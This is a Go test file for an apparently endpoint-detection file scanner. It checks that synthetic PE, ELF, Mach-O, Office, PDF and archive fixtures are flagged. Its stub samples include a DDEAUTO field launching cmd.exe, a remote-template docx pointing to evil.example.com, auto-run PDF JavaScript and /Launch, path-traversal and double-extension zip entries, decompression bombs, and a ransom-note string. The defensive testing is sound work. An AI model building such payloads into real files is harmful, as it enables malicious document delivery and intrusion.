// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestFileFormatDetection(t *testing.T) {
	iso := make([]byte, 0x8010)
	copy(iso[0x8001:], "CD001")
	cases := map[string][]byte{
		"PE":               fileBenignPE(),
		"ELF":              fileBenignELF(),
		"Mach-O":           fileBuildMachO(fileMachoSpec{signed: true}),
		"Mach-O fat":       fileBuildFat(fileBuildMachO(fileMachoSpec{})),
		"OOXML":            fileBuildDocx(),
		"JAR":              fileBuildZip([]fileZent{{name: "META-INF/MANIFEST.MF", data: []byte("Manifest-Version: 1.0")}}),
		"APK":              fileBuildZip([]fileZent{{name: "AndroidManifest.xml", data: []byte("x")}, {name: "classes.dex", data: []byte("dex")}}),
		"ZIP":              fileBuildZip([]fileZent{{name: "a.txt", data: []byte("a")}}),
		"PDF":              []byte("%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF"),
		"gzip":             fileGz([]byte("hello")),
		"OLE2":             append([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"), make([]byte, 64)...),
		"script (shebang)": []byte("#!/bin/sh\necho hi\n"),
		"LNK":              append([]byte("\x4c\x00\x00\x00\x01\x14\x02\x00"), make([]byte, 64)...),
		"ISO9660":          iso,
		"DOS/MZ":           append([]byte("MZ"), make([]byte, 100)...),
	}
	for want, data := range cases {
		if got := detectFileFormat(data); got != want {
			t.Errorf("want %s got %q", want, got)
		}
		if r := fileRun(data); r.Format == "" || len(r.Errors) > 0 {
			t.Errorf("%s: format=%q errors=%v", want, r.Format, r.Errors)
		}
	}
	if got := detectFileFormat([]byte("random text")); got != "" {
		t.Errorf("text detected as %q", got)
	}
	// Java class shares the fat magic; a big version number must not be fat.
	if got := detectFileFormat([]byte("\xca\xfe\xba\xbe\x00\x00\x00\x34rest")); got != "Java class" {
		t.Errorf("got %q", got)
	}
}

func TestFilePEBenignIsClean(t *testing.T) {
	r := fileRun(fileBenignPE())
	if r.Level != "clean" {
		t.Fatalf("benign PE level %s factors=%v", r.Level, r.Factors)
	}
	if r.Format != "PE32+" && r.Format != "PE" {
		t.Fatalf("format %q", r.Format)
	}
	fileMustNotHave(t, r, "file-pe-rwx-section", "file-pe-api-injection", "file-pe-timestamp-zero", "file-pe-malformed")
}

func TestFilePEPackedInjector(t *testing.T) {
	enc := filePrand(8192, 7)
	pe := fileBuildPE(filePESpec{ts: 0, entry: 0x2000,
		secs:    []filePESec{{"UPX0", 0x1000, fileScnRX, make([]byte, 600)}, {"UPX1", 0x2000, fileScnRWX, enc}},
		imports: []string{"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "LoadLibraryA", "IsDebuggerPresent", "CheckRemoteDebuggerPresent"}})
	r := fileRun(pe)
	fileMustHave(t, r, "file-pe-packer-section", "file-pe-rwx-section", "file-pe-high-entropy-exec", "file-pe-api-injection", "file-pe-api-antidebug", "file-pe-timestamp-zero")
	if r.Level == "clean" || r.Level == "low" {
		t.Fatalf("combo should reach suspicious+, got %s score %d", r.Level, r.Score)
	}
	for _, f := range r.Findings {
		if !strings.HasPrefix(f.ID, "file-") {
			t.Errorf("id prefix: %s", f.ID)
		}
	}
}

func TestFileWeakSignalsNeverReachVerdict(t *testing.T) {
	// zero timestamp, stripped ELF and unsigned Mach-O are each weak alone.
	pe := fileBuildPE(filePESpec{ts: 0, entry: 0x1000, secs: []filePESec{{".text", 0x1000, fileScnCode, bytes.Repeat([]byte{0x90}, 600)}}})
	if r := fileRun(pe); r.Level != "clean" {
		t.Errorf("pe: %s %v", r.Level, r.Factors)
	}
	if r := fileRun(fileBenignELF()); r.Level != "clean" {
		t.Errorf("elf: %s %v", r.Level, r.Factors)
	}
	if r := fileRun(fileBuildMachO(fileMachoSpec{arm64: true, dylibs: []string{"/usr/lib/libSystem.B.dylib"}})); r.Level != "clean" {
		t.Errorf("macho: %s %v", r.Level, r.Factors)
	}
}

func TestFilePETimestampAndAuthenticode(t *testing.T) {
	text := bytes.Repeat([]byte{0x90}, 600)
	future := fileBuildPE(filePESpec{ts: uint32(time.Now().Add(400 * 24 * time.Hour).Unix()), entry: 0x1000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}}})
	fileMustHave(t, fileRun(future), "file-pe-timestamp-future")
	signed := fileBuildPE(filePESpec{ts: 1700000000, entry: 0x1000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}}, certSize: 2048})
	r := fileRun(signed)
	fileMustHave(t, r, "file-pe-authenticode-present")
	f := fileFindingIDs(r)["file-pe-authenticode-present"]
	if f.Weight != 0 || !strings.Contains(f.Evidence, "not validate") {
		t.Errorf("must not claim verification: %+v", f)
	}
	if r.Meta["file-binary.pe.authenticode_verified"] != false && r.Meta["test.pe.authenticode_verified"] != false {
		// analyzer name prefix is the registry name; accept either form
		found := false
		for k, v := range r.Meta {
			if strings.HasSuffix(k, "authenticode_verified") && v == false {
				found = true
			}
		}
		if !found {
			t.Errorf("meta not set: %v", r.Meta)
		}
	}
	fileMustNotHave(t, r, "file-pe-overlay-large") // certificate is not an overlay
	big := fileBuildPE(filePESpec{ts: 1700000000, entry: 0x1000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}}, overlay: 200000})
	fileMustHave(t, fileRun(big), "file-pe-overlay-large")
}

func TestFilePEEntryPointOddities(t *testing.T) {
	text := bytes.Repeat([]byte{0x90}, 600)
	outside := fileBuildPE(filePESpec{ts: 1700000000, entry: 0x9000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}}})
	fileMustHave(t, fileRun(outside), "file-pe-entry-outside")
	nonexec := fileBuildPE(filePESpec{ts: 1700000000, entry: 0x2000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}, {".data", 0x2000, fileScnData, text}}})
	fileMustHave(t, fileRun(nonexec), "file-pe-entry-nonexec")
}

func TestFilePECredentialAndNetCrypto(t *testing.T) {
	text := bytes.Repeat([]byte{0x90}, 600)
	pe := fileBuildPE(filePESpec{ts: 1700000000, entry: 0x1000, secs: []filePESec{{".text", 0x1000, fileScnCode, text}},
		imports: []string{"MiniDumpWriteDump", "CryptUnprotectData", "InternetOpenA", "CryptEncrypt", "ExitProcess"}})
	fileMustHave(t, fileRun(pe), "file-pe-api-credential", "file-pe-api-netcrypto")
}

func TestFileELF(t *testing.T) {
	r := fileRun(fileBenignELF())
	if r.Format != "ELF" {
		t.Fatal(r.Format)
	}
	fileMustNotHave(t, r, "file-elf-odd-interp", "file-elf-rwx-segment", "file-elf-malformed")
	bad := fileBuildELF(fileELFSpec{interp: "/tmp/.x/ld.so", loadFlag: 7, secFlags: 7, secName: "UPX0", imports: []string{"ptrace", "memfd_create", "fexecve", "dlsym"}, extra: []byte("UPX! LD_PRELOAD /proc/self/mem")})
	r = fileRun(bad)
	fileMustHave(t, r, "file-elf-odd-interp", "file-elf-rwx-segment", "file-elf-wx-section", "file-elf-suspicious-section", "file-elf-ptrace", "file-elf-fileless-exec", "file-elf-ld-preload", "file-elf-proc-mem", "file-elf-upx")
	if r.Level == "clean" {
		t.Fatalf("level %s", r.Level)
	}
	fileMustHave(t, fileRun(fileBuildELF(fileELFSpec{interp: "/lib64/ld-linux-x86-64.so.2", loadFlag: 5, noSecs: true})), "file-elf-no-sections")
}

func TestFileMachO(t *testing.T) {
	r := fileRun(fileBuildMachO(fileMachoSpec{signed: true, dylibs: []string{"/usr/lib/libSystem.B.dylib", "@rpath/libfoo.dylib"}}))
	fileMustNotHave(t, r, "file-macho-unsigned", "file-macho-odd-dylib", "file-macho-malformed")
	r = fileRun(fileBuildMachO(fileMachoSpec{dylibs: []string{"/tmp/evil.dylib"}, segProt: 7,
		trailer: "com.apple.security.cs.disable-library-validation com.apple.security.get-task-allow DYLD_INSERT_LIBRARIES"}))
	fileMustHave(t, r, "file-macho-unsigned", "file-macho-odd-dylib", "file-macho-rwx-segment", "file-macho-risky-entitlements", "file-macho-dyld-insert")
	rf := fileRun(fileBuildFat(fileBuildMachO(fileMachoSpec{arm64: true})))
	fileMustHave(t, rf, "file-macho-unsigned")
	if len(rf.Errors) > 0 {
		t.Fatal(rf.Errors)
	}
}

func TestFileIOCExtraction(t *testing.T) {
	in := `hxxps://evil[.]example[.]com/a.php 8.8.8.8 10.0.0.1 192.168.1.1 127.0.0.1 version 1.2.3.4.5 11.22.33.44.55
user@bad-domain[.]ru HKLM\Software\Microsoft\Windows\CurrentVersion\Run\upd C:\Users\Public\a.exe
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb 0x52908400098527886E0F7030069857D2E4169EE7
main.py libc.so kernel32.dll schemas.microsoft.com 2001:4860:4860::8888 fe80::1 12:34:56 evil2(dot)org`
	got := extractIOCs(in, 500)
	has := func(typ, val string) bool {
		for _, g := range got {
			if g.Typ == typ && g.Val == val {
				return true
			}
		}
		return false
	}
	for _, w := range [][2]string{{"url", "https://evil.example.com/a.php"}, {"domain", "evil.example.com"}, {"ipv4", "8.8.8.8"},
		{"email", "user@bad-domain.ru"}, {"registry", `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\upd`},
		{"path", `C:\Users\Public\a.exe`}, {"wallet", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"},
		{"wallet", "0x52908400098527886E0F7030069857D2E4169EE7"}, {"ipv6", "2001:4860:4860::8888"}, {"domain", "evil2.org"}} {
		if !has(w[0], w[1]) {
			t.Errorf("missing %v in %v", w, got)
		}
	}
	for _, n := range [][2]string{{"ipv4", "10.0.0.1"}, {"ipv4", "192.168.1.1"}, {"ipv4", "127.0.0.1"}, {"ipv4", "1.2.3.4"}, {"ipv4", "11.22.33.44"},
		{"wallet", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"}, {"domain", "main.py"}, {"domain", "libc.so"}, {"domain", "kernel32.dll"},
		{"domain", "schemas.microsoft.com"}, {"ipv6", "fe80::1"}} {
		if has(n[0], n[1]) {
			t.Errorf("noise kept: %v", n)
		}
	}
}

func TestFileStringsAnalyzerASCIIAndUTF16(t *testing.T) {
	var d []byte
	d = append(d, 0, 1, 2, 3)
	d = append(d, []byte("http://ascii.example.net/p\xff\x00")...)
	for _, c := range "http://wide.example.org/x" {
		d = append(d, byte(c), 0)
	}
	d = append(d, 0, 0, 0xff, 0xff)
	d = append(d, []byte(`Your files have been encrypted 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`)...)
	r := fileRun(d)
	if !fileHasIOC(r, "url", "http://ascii.example.net/p") || !fileHasIOC(r, "url", "http://wide.example.org/x") {
		t.Fatalf("iocs: %v", r.IOCs)
	}
	fileMustHave(t, r, "file-str-ransom-note", "file-str-wallet", "file-str-wallet-ransom")
	bigN := 3 << 20 // 24 MiB, many strings
	if raceEnabled {
		bigN = 3 << 18 // 2 MiB: the race detector makes the 5 s analyzer budget flaky at full size
	}
	big := bytes.Repeat([]byte("abcdefg\x00"), bigN)
	r = fileRun(big)
	if len(r.Errors) > 0 {
		t.Fatal(r.Errors)
	}
}

func TestFileOOXML(t *testing.T) {
	r := fileRun(fileBuildDocx())
	fileMustNotHave(t, r, "file-ooxml-macro", "file-ooxml-template-injection", "file-ooxml-dde", "file-ooxml-external-rel")
	if r.Level != "clean" {
		t.Fatalf("plain docx: %s %v", r.Level, r.Factors)
	}
	if !fileHasIOC(r, "url", "https://example.org/") {
		t.Errorf("hyperlink IOC missing: %v", r.IOCs)
	}
	evil := fileBuildDocx(
		fileZent{name: "word/vbaProject.bin", data: []byte("\xd0\xcf\x11\xe0 vba")},
		fileZent{name: "word/embeddings/oleObject1.bin", data: []byte("ole")},
		fileZent{name: "word/_rels/settings.xml.rels", data: []byte(`<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example.com/t.dotm?a=1&amp;b=2" TargetMode="External"/></Relationships>`)},
		fileZent{name: "word/footnotes.xml", data: []byte(`<w:p><w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc" </w:instrText></w:p>`)},
	)
	r = fileRun(evil)
	fileMustHave(t, r, "file-ooxml-macro", "file-ooxml-template-injection", "file-ooxml-dde", "file-ooxml-embedded")
	if !fileHasIOC(r, "url", "http://evil.example.com/t.dotm?a=1&b=2") {
		t.Errorf("template IOC: %v", r.IOCs)
	}
	if r.Level == "clean" || r.Level == "low" {
		t.Errorf("level %s", r.Level)
	}
}

func TestFilePDF(t *testing.T) {
	benign := []byte("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF")
	if r := fileRun(benign); r.Level != "clean" || r.Format != "PDF" {
		t.Fatalf("benign pdf: %s %v", r.Level, r.Factors)
	}
	js := []byte("%PDF-1.7\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> /URI (http://p.example.com/x) >>\nendobj\n")
	r := fileRun(js)
	fileMustHave(t, r, "file-pdf-javascript", "file-pdf-js", "file-pdf-openaction", "file-pdf-autorun-js")
	// /Launch inside a compressed stream and an obfuscated name.
	inner := []byte("<< /S /Launch /URI (https://hidden.example.org/z) >>")
	hidden := append([]byte("%PDF-1.7\n1 0 obj\n<< /J#61vaScript /Filter /FlateDecode >>\nstream\n"), fileZl(inner)...)
	hidden = append(hidden, []byte("\nendstream\nendobj\n")...)
	r = fileRun(hidden)
	fileMustHave(t, r, "file-pdf-launch", "file-pdf-javascript", "file-pdf-name-obfuscation")
	if !fileHasIOC(r, "url", "https://hidden.example.org/z") {
		t.Errorf("iocs %v", r.IOCs)
	}
	// Decompression bomb inside a PDF stream is capped, not expanded.
	bomb := append([]byte("%PDF-1.7\nstream\n"), fileZl(make([]byte, scaleN(64<<20, 16<<20)))...)
	bomb = append(bomb, "\nendstream"...)
	start := time.Now()
	r = fileRun(bomb)
	if time.Since(start) > 5*time.Second || len(r.Errors) > 0 {
		t.Fatalf("pdf bomb: %v %v", time.Since(start), r.Errors)
	}
}

func TestFileOLE2(t *testing.T) {
	d := append([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"), utf16le("WordDocument")...)
	d = append(d, utf16le("_VBA_PROJECT")...)
	d = append(d, utf16le("\x01Ole10Native")...)
	r := fileRun(d)
	fileMustHave(t, r, "file-ole-macro", "file-ole-embedded")
}

func TestFileArchiveFindings(t *testing.T) {
	z := fileBuildZip([]fileZent{
		{name: "../../evil.txt", data: []byte("x")},
		{name: "invoice.pdf.exe", data: []byte("MZ\x90\x00")},
		{name: "readme.txt", data: []byte("MZ\x90\x00 pretend exe content")},
		{name: "run.bat", data: []byte("echo")},
		{name: "disk.iso", data: []byte("iso")},
		{name: "ok.txt", data: []byte("fine")},
	})
	r := fileRun(z)
	fileMustHave(t, r, "file-arch-traversal", "file-arch-double-extension", "file-arch-executable", "file-arch-script", "file-arch-disk-image", "file-arch-disguised-exec")
	clean := fileRun(fileBuildZip([]fileZent{{name: "a.txt", data: []byte("hello")}, {name: "dir/b.txt", data: []byte("world")}}))
	if clean.Level != "clean" || len(clean.Findings) > 0 {
		t.Fatalf("benign zip: %v", clean.Findings)
	}
}

func TestFileArchiveEncrypted(t *testing.T) {
	z := fileBuildZip([]fileZent{{name: "secret.docx", data: []byte("data")}})
	// set general-purpose bit 0 (encrypted) in the central directory entry
	i := bytes.Index(z, []byte("PK\x01\x02"))
	z[i+8] |= 1
	r := fileRun(z)
	fileMustHave(t, r, "file-arch-encrypted")
}

func TestFileZipBombRatio(t *testing.T) {
	z := fileBuildZip([]fileZent{{name: "zeros.bin", data: make([]byte, scaleN(40<<20, 24<<20))}})
	if len(z) > 200<<10 {
		t.Fatalf("fixture not compressed: %d", len(z))
	}
	start := time.Now()
	r := fileRun(z)
	fileMustHave(t, r, "file-arch-bomb")
	if len(r.Errors) > 0 || time.Since(start) > 4*time.Second {
		t.Fatalf("errors=%v dur=%v limits=%v", r.Errors, time.Since(start), r.LimitsHit)
	}
	// gzip bomb: capped read, flagged.
	g := fileGz(make([]byte, scaleN(64<<20, 24<<20)))
	r = fileRun(g)
	fileMustHave(t, r, "file-arch-bomb")
}

func TestFileZipNestedDepth(t *testing.T) {
	inner := fileBuildZip([]fileZent{{name: "x.txt", data: []byte("end")}})
	for i := 0; i < 12; i++ {
		inner = fileBuildZip([]fileZent{{name: fmt.Sprintf("n%d.zip", i), data: inner}})
	}
	r := fileRun(inner)
	fileMustHave(t, r, "file-arch-deep-nesting")
	limited := strings.Join(r.LimitsHit, " ")
	if !strings.Contains(limited, "archive-depth") {
		t.Errorf("depth limit not reported: %v", r.LimitsHit)
	}
	if len(r.Layers) > InspectMaxLayers {
		t.Errorf("layers %d", len(r.Layers))
	}
	// gzip inside gzip chain
	g := []byte("MZ-payload")
	for i := 0; i < 12; i++ {
		g = fileGz(g)
	}
	r = fileRun(g)
	if len(r.Errors) > 0 {
		t.Fatal(r.Errors)
	}
	fileMustHave(t, r, "file-arch-deep-nesting")
}

func TestFileHugeEntryCountIsRefused(t *testing.T) {
	// EOCD claiming 0xFFFF entries must not make the stdlib allocate.
	d := append([]byte("PK\x03\x04"), make([]byte, 40)...)
	eocd := make([]byte, 22)
	copy(eocd, "PK\x05\x06")
	binary.LittleEndian.PutUint16(eocd[8:], 0xFFFF)
	binary.LittleEndian.PutUint16(eocd[10:], 0xFFFF)
	r := fileRun(append(d, eocd...))
	if len(r.Errors) > 0 {
		t.Fatal(r.Errors)
	}
}

// Truncating or corrupting every fixture at many points must never panic,
// error out of an analyzer or hang.
func TestFileTruncatedAndGarbage(t *testing.T) {
	fixtures := map[string][]byte{
		"pe": fileBenignPE(), "elf": fileBenignELF(), "macho": fileBuildMachO(fileMachoSpec{signed: true, dylibs: []string{"/usr/lib/libSystem.B.dylib"}}),
		"fat": fileBuildFat(fileBuildMachO(fileMachoSpec{})), "docx": fileBuildDocx(), "zip": fileBuildZip([]fileZent{{name: "a", data: []byte("hello")}}),
		"gz": fileGz([]byte("hello world")), "pdf": []byte("%PDF-1.4\n/JS (x)\nstream\nxx\nendstream"),
	}
	for name, d := range fixtures {
		for cut := 0; cut < len(d); cut += 1 + len(d)/97 {
			if r := fileRun(d[:cut]); len(r.Errors) > 0 {
				t.Fatalf("%s cut %d: %v", name, cut, r.Errors)
			}
		}
		for i := 0; i < 40; i++ {
			m := append([]byte(nil), d...)
			x := filePrand(8, uint64(i+1))
			for j := 0; j < 4; j++ {
				m[int(x[j])*len(m)/256] = x[j+4]
			}
			if r := fileRun(m); len(r.Errors) > 0 {
				t.Fatalf("%s mut %d: %v", name, i, r.Errors)
			}
		}
	}
	for i := 0; i < 20; i++ {
		g := filePrand(2000, uint64(i+100))
		for _, magic := range []string{"MZ", "\x7fELF", "\xcf\xfa\xed\xfe", "PK\x03\x04", "%PDF-", "\x1f\x8b\x08", "\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"} {
			copy(g, magic)
			if r := fileRun(g); len(r.Errors) > 0 {
				t.Fatalf("garbage %q: %v", magic, r.Errors)
			}
		}
	}
}

// ---- fuzz targets: one per parser, no panics ----

func fuzzParser(f *testing.F, seeds [][]byte, fn func(context.Context, []byte, *InspectBuilder)) {
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<20 {
			return
		}
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		fn(ctx, data, fileTestBuilder())
	})
}

func FuzzFilePE(f *testing.F) {
	fuzzParser(f, [][]byte{fileBenignPE(), fileBuildPE(filePESpec{secs: []filePESec{{"UPX0", 0x1000, fileScnRWX, filePrand(1024, 3)}}, imports: []string{"WriteProcessMemory"}})}, analyzePE)
}
func FuzzFileELF(f *testing.F) {
	fuzzParser(f, [][]byte{fileBenignELF(), fileBuildELF(fileELFSpec{interp: "/tmp/x", loadFlag: 7, secFlags: 7, imports: []string{"ptrace"}})}, analyzeELF)
}
func FuzzFileMachO(f *testing.F) {
	fuzzParser(f, [][]byte{fileBuildMachO(fileMachoSpec{signed: true, dylibs: []string{"/usr/lib/x.dylib"}}), fileBuildFat(fileBuildMachO(fileMachoSpec{}))}, analyzeMachO)
}
func FuzzFileStrings(f *testing.F) {
	fuzzParser(f, [][]byte{[]byte("hxxp://a[.]example[.]com 1.2.3.4 8.8.8.8 a@b.com"), []byte("h\x00t\x00t\x00p\x00:\x00/\x00/\x00x\x00")}, analyzeStrings)
}
func FuzzFileOOXML(f *testing.F) {
	fuzzParser(f, [][]byte{fileBuildDocx(), fileBuildDocx(fileZent{name: "word/vbaProject.bin", data: []byte("x")})}, analyzeOOXML)
}
func FuzzFilePDF(f *testing.F) {
	fuzzParser(f, [][]byte{[]byte("%PDF-1.4\n/OpenAction /J#53 /URI (http://x.example.com)\nstream\n" + string(fileZl([]byte("/Launch"))) + "\nendstream")}, analyzePDF)
}
func FuzzFileArchive(f *testing.F) {
	fuzzParser(f, [][]byte{fileBuildZip([]fileZent{{name: "../a.exe", data: []byte("MZ")}}), fileGz([]byte("PK\x03\x04")), fileBuildDocx()}, analyzeArchive)
}
